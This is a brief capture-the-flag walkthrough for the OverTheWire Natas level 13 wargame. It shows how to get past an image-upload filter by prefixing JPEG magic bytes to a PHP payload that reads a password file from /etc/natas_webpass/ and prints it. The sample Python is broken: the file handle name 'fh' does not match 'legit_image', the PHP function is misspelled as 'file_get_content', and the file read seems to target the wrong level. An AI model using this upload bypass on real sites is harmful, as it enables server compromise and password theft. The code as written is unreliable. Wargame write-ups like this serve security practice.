# URL: http://natas13.natas.labs.overthewire.org/

# Solution:

It's the same as LEVEL_12 but your PHP script must include JPEG / image magic singature at the beggining for example: (BE SURE TO ACTUALLY WRITE IT AS HEX VALUE - EASIEST WAY THROUGH SOME QUICK PYTHON):  
`0xFFD8FFE0`

```
fh = open('legit_image.php', 'w')
legit_image.write('\xFF\xD8\xFF\xE0' + '<?php $password_maybe = file_get_content(\'/etc/natas_webpass/natas13\'); echo $password_maybe; ?>')
legit_image.close()
```
